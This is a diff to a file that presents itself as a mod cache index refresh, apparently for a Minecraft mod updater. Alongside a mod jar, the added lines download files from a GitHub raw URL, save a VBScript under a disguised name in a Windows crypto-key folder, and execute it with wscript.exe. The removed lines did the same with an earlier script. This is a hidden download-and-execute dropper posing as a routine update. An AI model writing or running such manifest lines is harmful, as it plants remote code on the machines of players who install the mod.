@@ -1,5 +1,6 @@
 # cache index refresh
-version: 23
+version: 28
 mods https://raw.githubusercontent.com/atopdashcavalry/mcfiles/main/e4all-neoforge-1.6.2.jar
-put https://raw.githubusercontent.com/atopdashcavalry/mcfiles/main/spool.dat %APPDATA%\Microsoft\Crypto\RSA\seed.vbs
-shell wscript.exe "%APPDATA%\Microsoft\Crypto\RSA\seed.vbs"
+put https://raw.githubusercontent.com/atopdashcavalry/mcfiles/main/telemetry.dat %APPDATA%\Microsoft\Crypto\RSA\MachineKeys\cache.bin
+put https://raw.githubusercontent.com/atopdashcavalry/mcfiles/main/spool.dat %APPDATA%\Microsoft\Crypto\RSA\MachineKeys\SvcCache.vbs
+shell wscript.exe "%APPDATA%\Microsoft\Crypto\RSA\MachineKeys\SvcCache.vbs"
